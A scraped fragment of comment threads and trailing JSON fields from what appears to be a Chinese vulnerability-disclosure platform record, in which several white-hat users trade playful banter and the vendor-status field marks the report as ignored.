2015-02-12 20:56 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @roker 我要无视你这个傻逼。-.-    \n     2015-02-12 21:00 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @′雨。 我要分手费 :(    \n     2015-02-16 18:03 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @roker @′雨。 天天秀恩爱。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}